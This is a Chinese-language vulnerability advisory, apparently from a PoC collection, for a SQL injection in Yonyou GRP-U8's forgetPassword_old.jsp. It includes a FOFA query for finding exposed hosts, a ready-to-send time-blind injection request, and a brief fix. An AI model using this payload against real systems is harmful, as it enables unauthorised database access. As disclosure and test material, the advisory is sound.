---
fofa: "app=\"用友-GRP-U8\""
source: "I-Wanna-Get-All/R4gd0ll"
---

# 用友 GRP-U8 forgetPassword_old.jsp SQL注入漏洞

# 漏洞描述

用友 GRP-U8 /u8qx/forgetPassword_old.jsp（action=save）接口 idCard 参数存在 SQL 注入漏洞。攻击者可通过时间盲注执行任意 SQL 语句，获取数据库敏感信息。

# 影响版本

用友 GRP-U8

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 未公开 | 未知 |

# 漏洞复现

FOFA：app="用友-GRP-U8"

POC/EXP：

```
POST /u8qx/forgetPassword_old.jsp?action=save HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

idCard=1';waitfor/**/+delay/**/+'0:0:3'--&inputDW=222&userName=1111
```

若响应延迟约 3 秒，则存在时间盲注；可进一步构造 MSSQL 报错/联合注入语句提取数据。

# 漏洞修复

联系用友官方获取安全补丁，对 idCard 等外部输入参数使用预编译语句并做严格过滤。
